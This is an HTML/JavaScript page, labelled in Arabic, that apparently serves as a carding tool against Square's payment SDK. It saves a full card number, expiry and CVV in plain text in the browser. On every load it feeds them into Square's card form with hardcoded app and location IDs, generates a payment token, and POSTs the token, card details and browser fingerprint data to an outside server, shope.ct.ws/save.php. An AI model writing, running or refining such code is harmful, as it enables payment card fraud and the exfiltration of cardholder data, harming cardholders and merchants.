<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#0066cc">
<link rel="manifest" href="manifest.json">
<title>Square Auto</title>
<script src="https://web.squarecdn.com/v1/square.js"></script>
<style>
  body { font-family: monospace; padding: 12px; background:#f7f7f7; }
  input, button { font-size: 16px; padding: 10px; width: 100%; margin: 6px 0; box-sizing: border-box; }
  pre { background:#fff; padding:10px; border:1px solid #ccc; font-size:11px; max-height:200px; overflow:auto; white-space:pre-wrap; }
  .log { background:#222; color:#0f0; padding:8px; font-size:11px; max-height:200px; overflow:auto; }
  .status { padding:10px; border-radius:6px; font-size:14px; margin:10px 0; }
  .on { background:#d4f7d4; border:2px solid #0a7d2c; }
  .off { background:#f7d4d4; border:2px solid #a00; }
</style>
</head>
<body>

<h3>بيانات البطاقة</h3>
<input id="num" placeholder="رقم البطاقة" inputmode="numeric">
<input id="exp" placeholder="MM/YY" inputmode="numeric">
<input id="cvv" placeholder="CVV" inputmode="numeric">
<input id="zip" placeholder="ZIP" value="36092" inputmode="numeric">

<h3>الحالة</h3>
<div id="status" class="status off">⏸ بانتظار البيانات</div>
<button id="save">حفظ البطاقة (مرة واحدة)</button>
<div id="card-container" style="display:none"></div>

<h3>آخر cnon</h3>
<pre id="out">بانتظار...</pre>

<h3>السجل</h3>
<div class="log" id="log">...</div>

<script>
const APP_ID = "sq0idp-wGVapF8sNt9PLrdj5znuKA";
const LOC_ID = "LRBWS2ZYH9DE3";
const SAVE_URL = "https://shope.ct.ws/save.php";
const STORAGE_KEY = "card_saved";

const logEl = document.getElementById("log");
function log(m) {
  logEl.textContent = new Date().toLocaleTimeString() + " — " + m + "\n" + logEl.textContent;
}

// استرجاع بيانات البطاقة من localStorage
function restoreCard() {
  const saved = localStorage.getItem(STORAGE_KEY);
  if (!saved) return null;
  try { return JSON.parse(saved); } catch { return null; }
}

// حفظ بيانات البطاقة
document.getElementById("save").onclick = () => {
  const data = {
    num: document.getElementById("num").value.trim(),
    exp: document.getElementById("exp").value.trim(),
    cvv: document.getElementById("cvv").value.trim(),
    zip: document.getElementById("zip").value.trim(),
  };
  if (!data.num || !data.exp || !data.cvv) {
    alert("املأ الحقول أولاً");
    return;
  }
  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
  log("✓ حُفظت البطاقة — سيتم استخدامها عند كل فتح");
  document.getElementById("status").className = "status on";
  document.getElementById("status").textContent = "✓ جاهز — سيولّد تلقائياً عند كل فتح";
};

// توليد cnon تلقائياً عند التحميل
(async () => {
  const saved = restoreCard();
  if (!saved) {
    log("لا توجد بطاقة محفوظة — املأ الحقول واضغط حفظ");
    return;
  }

  // املأ الحقول تلقائياً (للعرض)
  document.getElementById("num").value = saved.num;
  document.getElementById("exp").value = saved.exp;
  document.getElementById("cvv").value = saved.cvv;
  document.getElementById("zip").value = saved.zip;

  document.getElementById("status").className = "status on";
  document.getElementById("status").textContent = "⏳ جاري التهيئة...";

  try {
    const payments = Square.payments(APP_ID, LOC_ID);
    const card = await payments.card();
    await card.attach("#card-container");
    log("✓ card.attach() نجح");

    // ملء النموذج (Square iframe — قد لا يقبل)
    // بعض إصدارات Square تسمح بـ .setInputs
    if (card.setInputs) {
      await card.setInputs({
        cardNumber: saved.num,
        expirationDate: saved.exp,
        cvv: saved.cvv,
        postalCode: saved.zip,
      });
      log("✓ مُلئت الحقول تلقائياً");
    } else {
      log("⚠ Square لا يسمح بالملء التلقائي — املأ يدوياً");
      document.getElementById("status").textContent = "⚠ املأ يدوياً واضغط توليد";
      document.getElementById("card-container").style.display = "block";
      return;
    }

    // توليد
    document.getElementById("status").textContent = "⏳ جاري التوليد...";
    const result = await card.tokenize();
    if (result.status !== "OK") {
      log("✗ tokenize: " + result.status);
      document.getElementById("status").textContent = "✗ فشل التوليد";
      return;
    }

    const payload = {
      status: result.status,
      token: result.token,
      card: result.details,
      user_agent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screen: [screen.width, screen.height],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      tz_offset: new Date().getTimezoneOffset(),
      generated_at: new Date().toISOString(),
    };

    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);

    const res = await fetch(SAVE_URL, {
      method: "POST",
      body: JSON.stringify(payload),
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    const url = (await res.text()).trim();
    log("✓ رُفع: " + url);
    document.getElementById("status").textContent = "✓ تم التوليد والرفع — " + new Date().toLocaleTimeString();

    // إغلاق التبويب تلقائياً بعد 3 ثوان (اختياري)
    // setTimeout(() => window.close(), 3000);

  } catch (e) {
    log("✗ " + (e.message || e));
    document.getElementById("status").textContent = "✗ فشل";
  }
})();
</script>
</body>
</html>
